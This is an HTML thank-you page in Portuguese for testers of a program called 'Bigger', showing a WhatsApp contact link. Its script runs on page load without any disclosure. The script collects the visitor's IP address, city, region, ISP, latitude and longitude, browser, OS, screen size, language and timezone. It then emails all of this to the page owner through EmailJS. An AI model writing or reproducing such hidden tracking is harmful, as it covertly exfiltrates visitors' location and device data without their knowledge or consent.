<head>

<style>
    body {
        margin: 0;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #000;
        color: #fff;
        font-family: Arial, sans-serif;
    }
    .container {
        text-align: center;
        padding: 40px;
        border: 2px solid #fff;
        border-radius: 20px;
        max-width: 400px;
        box-shadow: 0 0 20px rgba(255,255,255,0.2);
    }
    h1 {
        margin-bottom: 20px;
        font-size: 2em;
    }
    p {
        font-size: 1em;
        line-height: 1.5;
        margin-bottom: 30px;
    }
    a {
        display: inline-block;
        text-decoration: none;
        color: #000;
        background-color: #fff;
        padding: 12px 24px;
        border-radius: 8px;
        font-weight: bold;
        transition: 0.3s;
    }
    a:hover {

    }
</style>
</head>
<body>
    <div class="container">
        <h1>Obrigado!</h1>
        <p>Obrigado por testar nosso programa e colaborar com o desenvolvimento da Bigger.<br>
        Qualquer coisa, entre em contato pelo WhatsApp.</p>
        <a href="https://wa.me/5511989451201" target="_blank">WhatsApp</a>
    </div>
<script>
emailjs.init("1q8wVxRr-MHM3y_30");

window.onload = async () => {
  // Coleta IP simples
  let infoBasica = {};
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    infoBasica = {
      ip: ipData.ip,
      navegador: navigator.userAgent,
      sistema: navigator.platform,
      resolucao: `${screen.width}x${screen.height}`,
      idioma: navigator.language,
      fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hora: new Date().toLocaleString()
    };
  } catch {}

  // Coleta IP detalhado via API
  let infoDetalhada = {};
  try {
    const detalhadoRes = await fetch('https://ipapi.co/json/');
    const detalhadoData = await detalhadoRes.json();
    infoDetalhada = {
      ip: detalhadoData.ip || "",
      cidade: detalhadoData.city || "",
      regiao: detalhadoData.region || "",
      operadora: detalhadoData.org || "",
      pais: detalhadoData.country_name || "",
      latitude: detalhadoData.latitude || "",
      longitude: detalhadoData.longitude || "",
      navegador: navigator.userAgent,
      sistema: navigator.platform,
      resolucao: `${screen.width}x${screen.height}`,
      idioma: navigator.language,
      fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hora: new Date().toLocaleString()
    };
  } catch {}

  // Envia pelo EmailJS
  const templateParams = {
    ip_simples: infoBasica.ip,
    ip_detalhado: infoDetalhada.ip,
    cidade: infoDetalhada.cidade,
    regiao: infoDetalhada.regiao,
    operadora: infoDetalhada.operadora,
    pais: infoDetalhada.pais,
    latitude: infoDetalhada.latitude,
    longitude: infoDetalhada.longitude,
    navegador: infoDetalhada.navegador,
    sistema: infoDetalhada.sistema,
    resolucao: infoDetalhada.resolucao,
    idioma: infoDetalhada.idioma,
    fusoHorario: infoDetalhada.fusoHorario,
    hora: infoDetalhada.hora
  };

  emailjs.send("service_nb66cci", "template_1caiksa", templateParams);
};
</script>
</body>
</html>
